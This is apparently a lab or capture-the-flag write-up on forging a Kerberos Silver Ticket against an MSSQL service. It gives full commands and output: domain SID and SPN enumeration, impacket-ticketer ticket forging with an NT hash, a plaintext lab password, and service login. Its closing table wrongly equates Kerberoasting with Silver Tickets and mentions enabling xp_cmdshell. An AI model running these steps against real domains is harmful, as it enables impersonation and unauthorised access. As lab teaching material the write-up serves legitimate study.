## What is a Silver Ticket?
Tickets used to forged Kerberos Ticket Granting Service (TGS) tickets that provide access to specific services on targeted servers. They are limited to the service they are designed for and do not grant domain-wide access.

## How to ?

### Pre-requisite
- FQDN of target host: The fully qualified domain name of the server hosting the Kerberos service.  
Example: fileserver.domain.local

- Service Name: The Kerberos service type bound to the SPN in AD (e.g., cifs, http, mssql).  
Example: cifs

- NTLM Hash (RC4 key): NT hash of the account (service account, computer account, or user account) used for Kerberos encryption/decryption.  
Example: 8846f7eaee8fb117ad06bdd830b7586c


#### Domain SID

```
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> (Get-ADdomain).DomainSID

BinaryLength AccountDomainSid                          Value
------------ ----------------                          -----
24 S-1-5-21-1969309164-1513403977-1686805993 S-1-5-21-1969309164-1513403977-1686805993
```          
#### TARGET SPN
```
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
DistinguishedName     : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com
Enabled               : True
GivenName             : svc_mssql
Name                  : svc_mssql
ObjectClass           : user
ObjectGUID            : df7dda21-173f-4a4a-88ed-70d69481b46e
SamAccountName        : svc_mssql
ServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com}
SID                   : S-1-5-21-1969309164-1513403977-1686805993-1136
Surname               :
UserPrincipalName     : svc_mssql@nagoya-industries.com

(Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames).ServicePrincipalNames

MSSQL/nagoya.nagoya-industries.com
```

#### NTHASH
Use [ntlm-hash-generator](https://codebeautify.org/ntlm-hash-generator)

#### Kerberos Configuration
Create `krb.conf` file
```
nxc smb 192.168.127.21 -u christopher.lewis -p P@ssword123 --generate-krb5-file nagoya_krb5
```
Edit `/etc/hosts` and save the files
```
export KRB5_CONFIG=./nagoya_krb5
```
### SILVER TICKET

Get Ticket for target user 
```
ftime impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -dc-ip 192.168.127.21 -spn MSSQL/nagoya.nagoya-industries.com svc_mssql
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/svc_mssql
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in svc_mssql.ccache
```
Export the ccache file
```
export KRB5CCNAME=./svc_mssql.ccache
```
Authenticate into the target service
```
ftime proxychains impacket-mssqlclient -k nagoya.nagoya-industries.com
```

### Password Authentication vs Kerberoast Authentication

| Aspect | Password Authentication | Kerberoast (Silver Ticket) |
|--------|-------------------------|-----------------------------|
| Method | Direct NTLM/password login to service | Forged Kerberos TGS for service SPN |
| Auth Type | NTLM/password-based | Kerberos ticket-based |
| Privilege Data | May lack full AD group info | Full PAC; can forge high privileges |
| Trust Source | Service verifies credentials | Service trusts DC-signed ticket |
| MSSQL Impact | Limited to real user rights | Can enable & run `xp_cmdshell` |
